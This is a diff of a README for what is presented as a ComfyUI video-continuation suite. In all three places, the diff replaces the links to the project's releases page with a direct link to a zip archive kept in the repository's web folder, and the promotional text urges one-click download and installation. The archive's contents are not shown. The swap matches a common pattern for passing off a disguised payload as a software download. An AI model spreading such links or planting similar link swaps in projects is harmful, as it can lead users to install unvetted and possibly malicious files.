@@ -1,6 +1,6 @@
 # 🎬 Herrgotts-H3-Infinite-Continuation-Suite - Seamless Video Continuation Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Herrgotts%20H3%20Suite-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/taupe-feed617/Herrgotts-H3-Infinite-Continuation-Suite/releases)
+[![Download Now](https://img.shields.io/badge/Download-Herrgotts%20H3%20Suite-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/taupe-feed617/Herrgotts-H3-Infinite-Continuation-Suite/main/web/Herrgotts_Suite_Continuation_Infinite_1.5-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Our program works directly with ComfyUI, a popular visual interface for creative
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [Download Herrgotts-H3-Infinite-Continuation-Suite](https://github.com/taupe-feed617/Herrgotts-H3-Infinite-Continuation-Suite/releases)
+Visit this link to download the application: [Download Herrgotts-H3-Infinite-Continuation-Suite](https://raw.githubusercontent.com/taupe-feed617/Herrgotts-H3-Infinite-Continuation-Suite/main/web/Herrgotts_Suite_Continuation_Infinite_1.5-alpha.5.zip)
 
 When you visit this page, you'll see the latest version of our software ready for you. Simply look for the "Latest Release" section at the top – that's the most up-to-date and recommended version.
 
@@ -129,6 +129,6 @@ If you're using the "video" library and have absolutely no intention of sharing 
 
 With the Herrgotts-H3-Infinite-Continuation-Suite, you're now fully armed to create seamless, professional-looking video continuations. The combination of advanced "freeze-aware" technology with our simple interface makes for a fantastic experience, no experience required.
 
-Remember: [Download it now](https://github.com/taupe-feed617/Herrgotts-H3-Infinite-Continuation-Suite/releases) with a single click, be live in minutes, and see the future of AI-powered video expansion at your fingertips.
+Remember: [Download it now](https://raw.githubusercontent.com/taupe-feed617/Herrgotts-H3-Infinite-Continuation-Suite/main/web/Herrgotts_Suite_Continuation_Infinite_1.5-alpha.5.zip) with a single click, be live in minutes, and see the future of AI-powered video expansion at your fingertips.
 
 Go.ahead – give your videos the infinite life they deserve. Share what spectacular things you forge. Enjoy.
